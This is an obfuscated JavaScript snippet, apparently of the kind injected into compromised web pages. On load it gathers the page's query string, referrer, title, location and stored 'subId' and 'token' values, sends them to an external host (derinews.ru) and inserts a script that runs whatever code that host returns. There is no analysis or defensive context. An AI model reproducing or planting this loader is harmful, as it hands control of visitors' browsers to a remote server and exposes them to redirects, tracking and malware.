(function() {
    var name = '_DH1xFsGRv2CL5vMw';
    if (!window._DH1xFsGRv2CL5vMw) {
        window._DH1xFsGRv2CL5vMw = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/Xw2LN2Jw',
        };
    }
    const _XJdZGS1s2rgp8wGV = localStorage.getItem('config');
    if (typeof _XJdZGS1s2rgp8wGV !== 'undefined' && _XJdZGS1s2rgp8wGV !== null) {
        var _zwjHxPtc1XGvq6d6 = JSON.parse(_XJdZGS1s2rgp8wGV);
        var _XGzL8xYLyq4zDmyK = Math.round(+new Date()/1000);
        if (_zwjHxPtc1XGvq6d6.created_at + window._DH1xFsGRv2CL5vMw.ttl < _XGzL8xYLyq4zDmyK) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _K85Qvjw2G6SnJX2f = localStorage.getItem('subId');
    var _BGThTshddGqQLgdh = localStorage.getItem('token');
    var _Fmf3KtxpScK99sRr = '?return=js.client';
        _Fmf3KtxpScK99sRr += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Fmf3KtxpScK99sRr += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Fmf3KtxpScK99sRr += '&default_keyword=' + encodeURIComponent(document.title);
        _Fmf3KtxpScK99sRr += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Fmf3KtxpScK99sRr += '&name=' + encodeURIComponent(name);
        _Fmf3KtxpScK99sRr += '&host=' + encodeURIComponent(window._DH1xFsGRv2CL5vMw.R_PATH);
    if (typeof _K85Qvjw2G6SnJX2f !== 'undefined' && _K85Qvjw2G6SnJX2f && window._DH1xFsGRv2CL5vMw.unique) {
        _Fmf3KtxpScK99sRr += '&sub_id=' + encodeURIComponent(_K85Qvjw2G6SnJX2f);
    }
    if (typeof _BGThTshddGqQLgdh !== 'undefined' && _BGThTshddGqQLgdh && window._DH1xFsGRv2CL5vMw.unique) {
        _Fmf3KtxpScK99sRr += '&token=' + encodeURIComponent(_BGThTshddGqQLgdh);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._DH1xFsGRv2CL5vMw.R_PATH + _Fmf3KtxpScK99sRr;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
